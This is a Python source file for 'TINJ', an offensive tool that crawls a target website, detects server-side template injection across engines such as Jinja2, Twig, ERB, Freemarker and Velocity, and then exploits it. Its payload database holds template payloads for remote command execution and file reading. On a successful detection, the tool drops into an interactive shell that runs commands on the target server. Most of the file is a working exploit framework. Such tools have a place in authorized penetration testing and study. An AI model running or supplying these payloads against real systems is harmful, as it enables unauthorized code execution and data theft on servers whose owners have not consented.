"""
Server-Side Template Injection (SSTI) Detection and Exploitation Tool
Author: Cyto0x
Version: 3.0
"""
import requests
import re
import argparse
import html
import urllib3
import json
import csv
from datetime import datetime
from urllib3.exceptions import InsecureRequestWarning
from urllib.parse import urlparse, urljoin, parse_qs
from bs4 import BeautifulSoup

# Disable SSL/TLS warnings for proxy debugging
urllib3.disable_warnings(InsecureRequestWarning)

# ANSI Color Codes
COLOR_RED = "\033[91m"
COLOR_GREEN = "\033[92m"
COLOR_YELLOW = "\033[93m"
COLOR_BLUE = "\033[94m"
COLOR_MAGENTA = "\033[95m"
COLOR_CYAN = "\033[96m"
COLOR_WHITE = "\033[97m"
COLOR_RESET = "\033[0m"
COLOR_BOLD = "\033[1m"
COLOR_UNDERLINE = "\033[4m"

# ASCII Art Banner
BANNER = f"""
{COLOR_RED}{COLOR_BOLD}
████████╗██╗███╗   ██╗     ██╗
╚══██╔══╝██║████╗  ██║     ██║
   ██║   ██║██╔██╗ ██║     ██║
   ██║   ██║██║╚██╗██║██   ██║
   ██║   ██║██║ ╚████║╚█████╔╝
   ╚═╝   ╚═╝╚═╝  ╚═══╝ ╚════╝ 
{COLOR_RESET}{COLOR_CYAN}
Server-Side Template Injection Toolkit
{COLOR_YELLOW}>> Version: 3.0 | By: Cyto0x <<{COLOR_RESET}
"""

# Configuration Constants
UNIQUE_PREFIX = "TINJ_"  # Template INJection marker prefix
REQUEST_TIMEOUT = 15     # Timeout for HTTP requests in seconds




class SiteCrawler:
    """Discovers potential parameters by crawling the target website"""
    
    def __init__(self, session, max_depth=2):
        """
        Initialize crawler with session and configuration
        
        Args:
            session: requests.Session object
            max_depth: Maximum recursion depth for crawling
        """
        self.session = session
        self.max_depth = max_depth
        self.visited_urls = set()
        self.discovered_params = set()
        self.base_domain = ""

    def _is_same_domain(self, url):
        """Check if URL belongs to the target domain"""
        return urlparse(url).netloc == self.base_domain

    def _extract_params_from_url(self, url):
        """Extract parameters from URL query string"""
        query = urlparse(url).query
        return set(parse_qs(query).keys())

    def _extract_params_from_form(self, soup):
        """Extract parameters from HTML forms"""
        params = set()
        for form in soup.find_all('form'):
            for input_tag in form.find_all('input'):
                if input_tag.get('name'):
                    params.add(input_tag['name'])
        return params

    def crawl(self, start_url):
        """
        Main crawling workflow
        
        Args:
            start_url: URL to start crawling from
            
        Returns:
            Set of discovered parameters
        """
        self.base_domain = urlparse(start_url).netloc
        self._crawl_recursive(start_url, depth=0)
        return self.discovered_params

    def _crawl_recursive(self, url, depth):
        """Recursive crawling implementation"""
        if depth > self.max_depth or url in self.visited_urls:
            return

        try:
            response = self.session.get(url, timeout=REQUEST_TIMEOUT, verify=False)
            self.visited_urls.add(url)
            
            # Extract parameters from current URL
            self.discovered_params.update(self._extract_params_from_url(url))
            
            # Parse HTML content
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Extract parameters from forms
            self.discovered_params.update(self._extract_params_from_form(soup))
            
            # Find and follow links
            if depth < self.max_depth:
                for link in soup.find_all('a', href=True):
                    next_url = urljoin(url, link['href'])
                    if self._is_same_domain(next_url):
                        self._crawl_recursive(next_url, depth + 1)

        except Exception as e:
            ColorPrinter.error(f"Crawling error at {url}: {str(e)}")




# Template engine payload database
EXPLOIT_PAYLOADS = {
    "ERB": {
        "exec": f"{UNIQUE_PREFIX}START<%= `COMMAND` %>TINJ_END",
        "read": f"{UNIQUE_PREFIX}START<%= File.read('FILE') %>TINJ_END",
    },
    "Jinja2": {
        "exec": f"{UNIQUE_PREFIX}START{{ self.__init__.__globals__.__builtins__.__import__('os').popen('COMMAND').read() }}TINJ_END",
        "read": f"{UNIQUE_PREFIX}START{{ ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['open']('FILE').read() }}TINJ_END",
    },
    "Twig": {
        "exec": f"{UNIQUE_PREFIX}START{{ _self.env.registerUndefinedFilterCallback('exec') }}{{ _self.env.getFilter('COMMAND') }}TINJ_END",
        "read": f"{UNIQUE_PREFIX}START{{ _self.env.registerUndefinedFilterCallback('system') }}{{ _self.env.getFilter('cat FILE') }}TINJ_END"
    },
    "Freemarker": {
        "exec": f"{UNIQUE_PREFIX}START<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${{ ex(\"COMMAND\") }}TINJ_END",
        "read": f"{UNIQUE_PREFIX}START${{product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve(\"FILE\").toURL().openStream().readAllBytes()?join(\" \")}}TINJ_END"
    },
    "Velocity": {
        "exec": f"{UNIQUE_PREFIX}START#set($str=$class.inspect(\"java.lang.String\").type)#set($chr=$class.inspect(\"java.lang.Character\").type)#set($ex=$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"COMMAND\"))TINJ_END",
        "read": f"{UNIQUE_PREFIX}START#set($str=$class.inspect(\"java.lang.String\").type)#set($chr=$class.inspect(\"java.lang.Character\").type)#set($is=$class.inspect(\"java.io.InputStream\").type)#set($fis=$class.inspect(\"java.io.FileInputStream\").type.getConstructor($str).newInstance(\"FILE\"))TINJ_END"
    }
}

class ColorPrinter:
    """Handles colorized output formatting"""
    
    @staticmethod
    def print_banner():
        """Display the ASCII art banner"""
        print(BANNER)
        
    @staticmethod
    def success(msg):
        print(f"{COLOR_GREEN}[+] {msg}{COLOR_RESET}")
        
    @staticmethod
    def warning(msg):
        print(f"{COLOR_YELLOW}[!] {msg}{COLOR_RESET}")
        
    @staticmethod
    def error(msg):
        print(f"{COLOR_RED}[-] {msg}{COLOR_RESET}")
        
    @staticmethod
    def info(msg):
        print(f"{COLOR_CYAN}[*] {msg}{COLOR_RESET}")
        
    @staticmethod
    def verbose(msg, title="DEBUG"):
        print(f"{COLOR_MAGENTA}[~] {title}: {msg}{COLOR_RESET}")

class ErrorBasedEngineDetector:
    """Detects template engines through error message analysis"""
    
    def __init__(self, session):
        """
        Initialize detector with common error-inducing payload
        
        Args:
            session: requests.Session object for HTTP communication
        """
        self.session = session
        self.error_payload = "${{<%[%'\"}}%\\"  # Malformed template payload
        self.engine_patterns = {
            "Jinja2": r"jinja2",
            "Twig": r"twig",
            "Django": r"django",
            "Freemarker": r"freemarker|freeMarker",
            "ERB": r"erb|Erb",
            "Handlebars": r"handlebars",
            "Velocity": r"velocity"
        }

    def detect(self, url, params):
        """
        Scan for template engines through error responses
        
        Args:
            url: Target URL to test
            params: List of parameters to test
            
        Returns:
            Dictionary containing vulnerability details or None
        """
        for param in params:
            try:
                response = self.session.get(
                    url,
                    params={param: self.error_payload},
                    timeout=REQUEST_TIMEOUT,
                    verify=False
                )
                
                if response.status_code == 500:
                    for engine, pattern in self.engine_patterns.items():
                        if re.search(pattern, response.text, re.IGNORECASE):
                            return {
                                "parameter": param,
                                "engine": engine,
                                "method": "error-based",
                                "evidence": f"Error message contains '{engine}'"
                            }
            except requests.exceptions.RequestException as e:
                ColorPrinter.error(f"Request failed for parameter {param}: {str(e)}")
                continue
        return None

class EvaluationBasedEngineDetector:
    """Identifies template engines through mathematical evaluation"""
    
    def __init__(self, session):
        """
        Initialize detector with engine-specific payloads
        
        Args:
            session: requests.Session object for HTTP communication
        """
        self.session = session
        self.payload_map = {
            "ERB": {
                "payload": f"{UNIQUE_PREFIX}ERB<%= 7*7 %>",
                "expected": f"{UNIQUE_PREFIX}ERB49"
            },
            "Jinja2": {
                "payload": f"{UNIQUE_PREFIX}JINJA{{7*'7'}}",
                "expected": f"{UNIQUE_PREFIX}JINJA7777777"
            },
            "Twig": {
                "payload": f"{UNIQUE_PREFIX}TWIG{{7*7}}",
                "expected": f"{UNIQUE_PREFIX}TWIG49"
            },
            "Freemarker": {
                "payload": f"{UNIQUE_PREFIX}FREEMARKER${{7*7}}",
                "expected": f"{UNIQUE_PREFIX}FREEMARKER49"
            },
            "Handlebars": {
                "payload": f"{UNIQUE_PREFIX}HANDLE{{7*7}}",
                "expected": f"{UNIQUE_PREFIX}HANDLE49"
            },
            "Velocity": {
                "payload": f"{UNIQUE_PREFIX}VELO#set($x=7*7)${{x}}",
                "expected": f"{UNIQUE_PREFIX}VELO49"
            }
        }

    def detect(self, url, params):
        """
        Execute evaluation-based detection workflow
        
        Args:
            url: Target URL to test
            params: List of parameters to test
            
        Returns:
            Dictionary containing vulnerability details or None
        """
        for param in params:
            for engine, data in self.payload_map.items():
                try:
                    response = self.session.get(
                        url,
                        params={param: data["payload"]},
                        timeout=REQUEST_TIMEOUT,
                        verify=False
                    )
                    
                    if data["expected"] in response.text:
                        return {
                            "parameter": param,
                            "engine": engine,
                            "method": "evaluation-based",
                            "evidence": f"Matched: {data['expected']}"
                        }
                except requests.exceptions.RequestException as e:
                    ColorPrinter.error(f"Detection failed for {engine}: {str(e)}")
                    continue
        return None

class SSTIScanner:
    """Main scanner class coordinating detection workflows"""
    
    def __init__(self, proxies=None, verbose=False, crawl=False, crawl_depth=2):
        """
        Initialize scanner with HTTP session configuration
        
        Args:
            proxies: Dictionary of proxies to use for requests
            verbose: Boolean to enable verbose logging
            crawl: Whether to enable automatic crawling
            crawl_depth: Maximum depth for crawling
        """
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) TINJ-Scanner/2.0"
        })
        self.verbose = verbose
        self.crawl = crawl
        self.crawl_depth = crawl_depth
        self.report_data = {
            "target": "",
            "timestamp": "",
            "findings": []
        }
        
        if proxies:
            self.session.proxies.update(proxies)
            self.session.verify = False  # Disable SSL verification for proxies

    def _log_verbose(self, message):
        """Log verbose messages if enabled"""
        if self.verbose:
            ColorPrinter.verbose(message)

    def scan(self, target_url, parameters):
        """
        Execute complete scanning workflow
        
        Args:
            target_url: URL to test for vulnerabilities
            parameters: List of parameters to test
            
        Returns:
            Dictionary containing vulnerability details or None
        """
        self.report_data["target"] = target_url
        self.report_data["timestamp"] = datetime.now().isoformat()
        
        ColorPrinter.info(f"Starting scan against {target_url}")
        
        # Crawl for parameters if enabled
        if self.crawl:
            ColorPrinter.info("Starting website crawling...")
            crawler = SiteCrawler(self.session, self.crawl_depth)
            crawled_params = crawler.crawl(target_url)
            parameters = list(set(parameters + list(crawled_params)))
            ColorPrinter.success(f"Discovered {len(crawled_params)} parameters through crawling")

        self._log_verbose(f"Final parameters being tested: {', '.join(parameters)}")

        # First try error-based detection
        error_detector = ErrorBasedEngineDetector(self.session)
        error_result = error_detector.detect(target_url, parameters)
        if error_result:
            self.report_data["findings"].append(error_result)
            self._print_vulnerability(error_result)
            return error_result
        
        # Fallback to evaluation-based detection
        eval_detector = EvaluationBasedEngineDetector(self.session)
        eval_result = eval_detector.detect(target_url, parameters)
        if eval_result:
            self.report_data["findings"].append(eval_result)
            self._print_vulnerability(eval_result)
            return eval_result

        ColorPrinter.error("No template injection vulnerabilities detected")
        return None

    def _print_vulnerability(self, result):
        """Print vulnerability details with color formatting"""
        ColorPrinter.success("\n=== SSTI Vulnerability Found ===")
        print(f"{COLOR_CYAN}Parameter: {COLOR_WHITE}{result['parameter']}")
        print(f"{COLOR_CYAN}Engine:    {COLOR_WHITE}{result['engine']}")
        print(f"{COLOR_CYAN}Method:    {COLOR_WHITE}{result['method']}")
        print(f"{COLOR_CYAN}Evidence:  {COLOR_WHITE}{result['evidence']}")
        ColorPrinter.success("===============================\n")

    def generate_report(self, format="json", filename=None):
        """Generate output reports in specified format"""
        if not filename or not self.report_data["findings"]:
            return
            
        try:
            if format == "json":
                with open(filename, 'w') as f:
                    json.dump(self.report_data, f, indent=2)
            elif format == "csv":
                with open(filename, 'w', newline='') as f:
                    writer = csv.writer(f)
                    writer.writerow(["Parameter", "Engine", "Method", "Evidence"])
                    for finding in self.report_data["findings"]:
                        writer.writerow([
                            finding["parameter"],
                            finding["engine"],
                            finding["method"],
                            finding["evidence"]
                        ])
            ColorPrinter.success(f"Report generated: {filename}")
        except Exception as e:
            ColorPrinter.error(f"Failed to generate report: {str(e)}")

class SSTIExploiter:
    """Exploitation handler for confirmed vulnerabilities"""
    
    def __init__(self, session, base_url, vulnerable_param, engine):
        """
        Initialize exploiter with target details
        
        Args:
            session: Established requests session
            base_url: Vulnerable endpoint URL
            vulnerable_param: Confirmed vulnerable parameter
            engine: Detected template engine
        """
        self.session = session
        self.base_url = base_url
        self.param = vulnerable_param
        self.engine = engine
        self.payloads = EXPLOIT_PAYLOADS.get(engine, {})

    def execute_command(self, command):
        """
        Generate and execute command injection payload
        
        Args:
            command: System command to execute
            
        Returns:
            Command output or None
        """
        if not self.payloads.get("exec"):
            ColorPrinter.error(f"Execution not supported for {self.engine}")
            return None
            
        payload = self.payloads["exec"].replace("COMMAND", command)
        return self._send_payload(payload)

    def read_file(self, filename):
        """
        Generate and execute file read payload
        
        Args:
            filename: Path to file to read
            
        Returns:
            File contents or None
        """
        if not self.payloads.get("read"):
            ColorPrinter.error(f"File read not supported for {self.engine}")
            return None
            
        payload = self.payloads["read"].replace("FILE", filename)
        return self._send_payload(payload)

    def _send_payload(self, payload):
        """
        Execute payload and process response
        
        Args:
            payload: Fully constructed exploit payload
            
        Returns:
            Cleaned response text or None
        """
        try:
            response = self.session.get(
                self.base_url,
                params={self.param: payload},
                timeout=REQUEST_TIMEOUT,
                verify=False
            )
            return self._clean_response(response.text)
        except Exception as e:
            ColorPrinter.error(f"Payload delivery failed: {str(e)}")
            return None
        
    def _clean_response(self, text):
        """
        Extract and clean response between markers
        
        Args:
            text: Raw response text
            
        Returns:
            Cleaned command output or default message
        """
        match = re.search(r'TINJ_START(.*?)TINJ_END', text, re.DOTALL)
        if match:
            cleaned = html.unescape(match.group(1))
            return re.sub(r'\s+', ' ', cleaned).strip()
        return "No output captured between markers"

def interactive_shell(exploiter):
    """
    Provide interactive command execution interface
    
    Args:
        exploiter: Initialized SSTIExploiter instance
    """
    ColorPrinter.success(f"\n[+] Entering {exploiter.engine} exploitation shell")
    ColorPrinter.warning("[!] Type 'exit' to quit")
    ColorPrinter.warning("[!] Commands will be executed on the target server\n")
    
    while True:
        try:
            cmd = input(f"{COLOR_RED}tinj-shell{COLOR_RESET}{COLOR_WHITE}» {COLOR_RESET}").strip()
            if not cmd:
                continue
            if cmd.lower() == "exit":
                break
                
            if cmd.startswith("read "):
                _, filename = cmd.split(" ", 1)
                result = exploiter.read_file(filename)
            else:
                result = exploiter.execute_command(cmd)
                
            if result:
                # print(f"\n{COLOR_BLUE}=== COMMAND OUTPUT ==={COLOR_RESET}")
                print(f"{COLOR_WHITE}{result}{COLOR_RESET}")
                # print(f"{COLOR_BLUE}======================{COLOR_RESET}\n")
            else:
                ColorPrinter.error("No response received from server")
                
        except KeyboardInterrupt:
            ColorPrinter.error("\n[-] Terminating session...")
            break
        except Exception as e:
            ColorPrinter.error(f"Execution error: {str(e)}")

if __name__ == "__main__":
    ColorPrinter.print_banner()
    
    # Command-line interface configuration
    parser = argparse.ArgumentParser(
        description='TINJ - Template INJection Scanner',
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=f'''{COLOR_CYAN}
Usage Examples:
  Basic scan:
    python tinj.py --url https://vuln-site.com
  
  Scan with verbose output:
    python tinj.py --url https://vuln-site.com --verbose
  
  Generate JSON report:
    python tinj.py --url https://vuln-site.com --output report.json --format json
  
  Scan through proxy:
    python tinj.py --url https://vuln-site.com --proxy 127.0.0.1:8080
  
  Custom parameters:
    python tinj.py --url https://vuln-site.com --params "user,custom_field"

Crawl and scan:
    python tinj.py --url https://vuln-site.com --crawl
  
  Deep crawl (depth 3):
    python tinj.py --url https://vuln-site.com --crawl --crawl-depth 3
{COLOR_RESET}'''
    )

    parser.add_argument('--url', required=True, help='Target URL to scan')
    parser.add_argument('--proxy', help='Proxy server (IP:PORT)')
    parser.add_argument('--params', default="message,email,username,name,search,q,input,id",
                      help='Parameters to test (comma-separated)')
    parser.add_argument('--verbose', action='store_true', help='Enable verbose output')
    parser.add_argument('--output', help='Output file for report')
    parser.add_argument('--format', choices=['json', 'csv'], default='json',
                      help='Report format (default: json)')
    # Add new arguments
    parser.add_argument('--crawl', action='store_true', 
                      help='Enable website crawling to discover parameters')
    parser.add_argument('--crawl-depth', type=int, default=2,
                      help='Maximum crawling depth (default: 2)')
    args = parser.parse_args()

    # Initialize scanner with crawling features
    scanner = SSTIScanner(
        proxies={'http': args.proxy, 'https': args.proxy} if args.proxy else None,
        verbose=args.verbose,
        crawl=args.crawl,
        crawl_depth=args.crawl_depth
    )
    
    # Run scan
    parameters = [p.strip() for p in args.params.split(',')]
    result = scanner.scan(args.url, parameters)
    
    # Generate report if requested
    if args.output:
        scanner.generate_report(format=args.format, filename=args.output)
    
    # Start exploitation if vulnerable
    if result:
        exploiter = SSTIExploiter(
            scanner.session,
            args.url,
            result['parameter'],
            result['engine']
        )
        interactive_shell(exploiter)
